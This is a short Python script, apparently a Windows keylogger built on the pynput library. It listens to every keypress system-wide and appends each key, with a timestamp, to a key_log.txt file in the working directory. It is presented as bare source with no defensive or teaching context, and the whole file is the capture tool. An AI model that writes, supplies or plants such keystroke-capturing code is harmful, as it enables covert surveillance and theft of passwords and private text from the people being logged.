from pynput import keyboard
import os
import datetime




def keyboard_log(key):
    CWD = os.getcwd()
    tt = datetime.datetime.today()
    CurrentTime = '{}:{}:{}'.format(tt.hour, tt.minute, tt.second)
    KeyLogFile = open(str(CWD)+'\\key_log.txt', 'a')
    if type(key) == keyboard._win32.KeyCode:
        k = CurrentTime + '\t:\t' + key.char
        k = k.encode('utf-8').decode('ascii', 'ignore')
    else:
        k = CurrentTime + '\t:\t' + str(key)
        k = k.encode('utf-8').decode('ascii', 'ignore')
    KeyLogFile.write('{}\n'.format(k))

def keyboard_start():
    with keyboard.Listener(on_press = keyboard_log) as lstn:
        lstn.join()


keyboard_start()
